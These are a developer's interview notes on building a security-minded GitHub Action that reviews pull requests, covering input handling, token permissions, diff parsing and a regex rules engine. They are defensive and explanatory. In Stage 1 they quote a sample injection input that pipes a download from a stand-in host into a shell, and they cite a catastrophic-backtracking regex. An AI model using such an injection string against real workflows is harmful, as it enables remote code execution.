# Interview notes

One section per build stage. Each has five likely questions, a failure I have
actually reasoned through, and the commit that introduced it.

## Stage 1 - Skeleton

### Five questions

**1. Why a composite action instead of a JavaScript or Docker action?**
Composite is just YAML steps, so there is no build step or image to publish and
anyone can read exactly what runs. Docker actions are slower (image pull) and
Linux-only; JS actions need a committed, bundled `dist/`. The cost: composite
steps get no automatic `INPUT_*` variables and no `permissions:` block of their
own, so I map inputs to env vars explicitly and the *caller's* workflow sets
permissions.

**2. Why pass inputs through `env:` instead of writing `${{ inputs.x }}` in `run:`?**
`${{ }}` is expanded by the runner *before* bash sees the script, so a crafted
input like `"; curl evil | sh` becomes part of the code. Via `env:` the value
stays data in an environment variable. A test fails if `${{` appears in a
`run:` block.

**3. Why pin Actions to a full commit SHA?**
Tags and branches are mutable: if an upstream maintainer account is
compromised, `@v4` can be repointed at malicious code that runs with your
token. A SHA is content-addressed. I keep the tag in a trailing comment for
humans, and a test enforces SHA pins for every `uses:`.

**4. Why does a missing API key mean "rules-only" instead of an error?**
The AI layer is optional, and fork PRs never receive secrets, so "no key" is a
normal state, not a misconfiguration. Failing would make the Action unusable on
every fork PR. Rules-only is also the safe fallback for cost and data privacy.

**5. Why `contents: read` + `pull-requests: write` only?**
Least privilege: if the Action or a dependency is compromised, the token can
read code and write PR reviews, but cannot push, alter workflows, or touch
releases. A repo test fails if a workflow asks for more.

### One common failure and how I'd debug it

**Symptom:** the step fails with `::error title=Invalid pr-guardian input::...`
and exit code 2.
**Debug:** exit 2 is reserved for *configuration* errors (findings will use a
different code), so it is never a bug in the PR under review. Read the
annotation: all problems are listed at once. Typical causes: `fail-on: High `
with a typo, `dry-run: yes` (must be `true`/`false`), or `max-files: 0`. Check
the `with:` block of the calling workflow. If the message is empty, run locally:
`PRG_GITHUB_TOKEN=x PYTHONPATH=src python -m pr_guardian`.

### Decisions worth remembering

- **Default model is `claude-sonnet-5-5`**, not Haiku 4.5: Anthropic's models
  page (checked 2026-10-03) lists Haiku 4.5 retiring no sooner than 2026-10-15.
- **Zero runtime dependencies** so far: nothing to `pip install` at action run
  time, so a smaller supply-chain surface. PyYAML arrives in Stage 3 (pinned).
- **Exit codes:** 0 ok, 2 config error; 1 (findings fail the check) is added in Stage 4.

### Suggested commit

```
feat: project skeleton with composite action, config validation and CI

Add the composite action (inputs mapped to env vars), a validated frozen
Config, ruff/pytest/pre-commit tooling with pinned versions and SHA-pinned
Actions, repo-policy tests (SHA pins, no pull_request_target, minimal
permissions) and CI including an action smoke test.
```

---

## Stage 2 - Diff handling

### Five questions

**1. Why can't I just comment on any line number I like?**
GitHub's review API only accepts comments on lines that appear in the diff
(changed lines plus a few lines of context). Anything else makes the request
fail - and a review is submitted as one request, so one bad comment can lose
the whole review. So every finding is mapped through a parsed patch first, and
a finding with no valid target is dropped, never guessed.

**2. `line`/`side` versus `position` - what's the difference?**
`position` counts lines down from the first `@@` and keeps counting across
hunks (including later `@@` headers), so it is easy to get wrong. `line` +
`side: RIGHT` is just "line N of the new file". I compute both and plan to post
with `line`/`side`; `position` is a cross-check. Removed lines have no line in
the new file, so they cannot be targeted on the RIGHT side.

**3. Why does the parser raise on a malformed hunk instead of doing its best?**
Failing closed. A wrong line mapping posts a comment on the wrong code, which
misleads people. Skipping the file *and listing it as skipped* is honest. A bug
I actually hit: counting the final empty string from a trailing newline as a
blank context line let a truncated hunk look complete. There is now a test.

**4. How do you stop one huge PR from blowing up the run?**
Layered caps: `max-files`, a per-file patch size limit, and a total size limit.
The cheap filters (deleted files, unsupported types, `paths`) run first so that
400 README edits can't use up the budget meant for Terraform. Every cap that
drops a supported file puts it in a visible skipped list - silent truncation
makes green look like "everything was checked".

**5. Why does the HTTP client refuse redirects, and why not use `requests`?**
Python's urllib forwards the `Authorization` header when following a redirect,
even to another host. For a client that holds a write token, "refuse and report"
is safer than "follow". Using only the standard library also means zero
runtime dependencies to pin, audit or install. The client also never follows
`Link` pagination URLs from the response; it builds each URL itself, so the
token can only go to the configured API host.

### One common failure and how I'd debug it

**Symptom:** `::error title=GitHub API error::GitHub denied access: the token
needs at least 'pull-requests: read'` (exit 3), or a 404 on a PR that clearly
exists.
**Debug:** exit 3 means GitHub, not the PR, is the problem. A 403/404 on a
private repo almost always means the workflow's `permissions:` block omits
`pull-requests` (listing any permission removes all unlisted ones). Add
`pull-requests: write`. On a fork PR the token is read-only by design - reading
works, so a 403 there points at something else. Check the "Set up job" log
section for the "GITHUB_TOKEN Permissions" listing.

### Decisions worth remembering

- **Refuse `pull_request_target`** in code, not just in docs - the rule is
  enforced where a misconfiguration would actually happen.
- **Hostile file names**: git allows newlines and backticks in names. They are
  sanitised before reaching the log, and later the Markdown summary.
- **Not yet verified against the live API**: tests use a fake GitHub. The first
  real run is the CI `action-smoke` job on a PR. `X-GitHub-Api-Version:
  2022-11-28` is the documented stable value; I could not re-check the newest
  value from this sandbox.

### Suggested commit

```
feat: fetch PR files and map findings to valid diff lines

Add a stdlib-only GitHub client (pagination, retries, no redirects), a
fail-closed unified-diff parser producing line and position maps, path-based
file classification, selection with max-files and size caps and a visible
skipped report, and PR context detection that refuses pull_request_target and
flags fork PRs.
```

---

## Stage 3 - Rules engine

### Five questions

**1. Why a deterministic rules engine *before* the AI layer?**
Rules are fast, free, repeatable and explainable: the same diff always gives
the same result, so a rule can safely gate a merge. An LLM is probabilistic, can
be manipulated by text in the diff, and costs money per run. So rules decide
pass/fail; the AI (Stage 5) only adds advisory context.

**2. How do you detect "0.0.0.0/0 in an *ingress* rule" with regex, when egress
legitimately uses the same CIDR?**
A single-line regex can't tell, so a rule can have a `within:` pattern: the
line must sit inside a visible enclosing block whose opener matches (found by
walking up by indentation). `cidr_blocks = ["0.0.0.0/0"]` inside `ingress {`
is flagged, inside `egress {` is not. If the opener isn't in the diff we stay
silent: we don't guess.

**3. How do you flag something that is *absent*, like missing resource limits?**
A diff only shows hunks, so "absent" can't be proven from a single line. The
`yaml_item_missing` rule type finds the container list item, and only reports
if the item's first line *and* the line that ends it are both visible, and the
PR actually changed that container. If the hunk cuts the container off, it says
nothing. I prefer a false negative I can document to a false positive that
makes people stop reading the bot.

**4. How do you keep regex rules from being a denial-of-service vector?**
The diff is attacker-controlled, and Python's `re` has no timeout. Defences:
patterns avoid nested quantifiers; lines over 10,000 characters are not
scanned (and are reported as GUARD-001 instead of silently skipped, since
padding a line is how you'd hide content); and a test runs every rule against
hostile lines on every file type with a 1 s budget. I checked that this test
bites: the worst real case is 2.5 ms, while one catastrophic regex such as
`(a+)+$` takes 26 s on a 29-character input.

**5. Why must a finding never include the matched text?**
Review comments on a public repo are public. If a PR contains a leaked key and
the bot quotes it in a comment, the bot has just published the secret a second
time, in a place that survives force-pushes. Messages are fixed text from the
policy file, a test asserts no secret value appears in any finding, and
fixtures build fake keys at test time so no literal secret-shaped string is ever
committed (it would trip GitHub push protection and my own repo scan).

### One common failure and how I'd debug it

**Symptom:** "my rule never fires" (a clean PR that clearly shouldn't be).
**Debug, in order:** (1) Was the file even reviewed? Check the *Reviewing* /
*Skipped* section of the log: wrong file type, `paths` filter, `max-files`, or
no patch from GitHub. (2) Is the offending line *added*? Context and removed
lines are never flagged. (3) Does the rule need context (`within`, or a
`yaml_item_missing` block) that isn't in the visible hunk? (4) Does the line
match the regex in isolation? Run it through `python -c` with `re` or, better,
add it to a fixture with an `EXPECT:` marker, which makes the test show exactly
what differs. (5) Is it a comment-only line? Only the SEC rules scan comments.

### Decisions worth remembering

- **Severity = impact x confidence.** Exact patterns are critical; heuristics
  (SEC-003) are medium, so the default `fail-on: high` doesn't block merges on
  guesses.
- **One finding per secret.** SEC-003 excludes lines that SEC-001 already
  reports (found when a fixture matched both).
- **The strict loader paid for itself immediately**: it rejected my own
  `K8S-001` id because my id regex disallowed digits.
- **17 rules, not "about 12"**: the extras (GHA-003 script injection, TF-002,
  K8S-004...) are the ones I'd most want to explain in an interview.
- **Fixtures use `EXPECT:` markers and require the exact set of findings across
  all rules**, so each fixture is simultaneously a true-positive and a
  false-positive test.

### Suggested commit

```
feat: rules engine with 17 generic policy rules and fixture tests

Add a strictly validated YAML policy, an engine that flags only added lines
and supports enclosing-block (within) and whole-container-visible
(yaml_item_missing) checks, a guard for unscannable long lines, static
non-echoing messages, fixture-driven true/false-positive tests, a ReDoS
timing test and rule documentation. Adds pinned PyYAML as the first runtime
dependency.
```
